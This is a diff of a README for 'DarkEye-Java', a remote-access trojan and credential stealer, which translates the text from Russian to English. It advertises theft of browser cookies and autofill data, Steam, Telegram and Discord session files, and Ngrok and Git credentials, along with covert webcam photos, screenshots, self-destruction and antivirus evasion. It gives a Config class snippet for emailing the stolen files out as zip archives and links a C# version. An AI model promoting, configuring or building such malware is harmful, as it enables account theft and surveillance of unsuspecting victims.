@@ -1,29 +1,30 @@
 # DarkEye-Java
 Rat/Stealer
 
-## Функции
-Отправка файлов происходит через почту (.zip)
+## Functions
+Files are sent via mail (.zip)
 
-- [Yandex, Chrome, Opera] Cookie, Auto-Fill, leveldb grabber
-- Steam: config, ssfn grabber
+- [Yandex, Chrome, Opera] Cookie, Auto-Fill, Bookmarks, leveldb
+- Steam: config, ssfn
 - Telegram: tdata
 - Discord: Cookie, leveldb
-- Скрин экрана
-- Фото с вебкамеры (имейте в виду что загарается лампа)
-- Самоуничтожение
+- [Apps] Ngrok, Git
+- Screenshot screen
+- Webcam photo (keep in mind that the lamp lights up)
+- Self-destruct
 - VirusTotal undetected
 
-## Конфиг
-В классе Config нужно вписать свои данные почты Отправителя и Получателя.
-В отправителя нужно выбрать какая почта (EMailMethod)
+## Configuration
+In the Config class, you need to enter your Sender and Recipient mail data.
+In the sender, you need to choose which mail (E-Mail Method)
 ```Java
 public static EMailData FROM_DATA = new EMailData("xxxxx@yandex.ru", "password", EMailMethod.YANDEX);
 public static EMailData TO_DATA = new EMailData("xxxxx@gmail.com");
 ```
 
-#### Настройка email
-##### Обьязательно*
-В настройках почты отправителя включите:
-Разрешить доступ к почтовому ящику с помощью почтовых клиентов IMAP
+### Email Setup
+#### Necessarily*
+In the sender's mail settings, enable:
+```Allow access to the mailbox using IMAP mail clients```
 
 [C# DarkEye](https://github.com/GishReloaded/DarkEye)
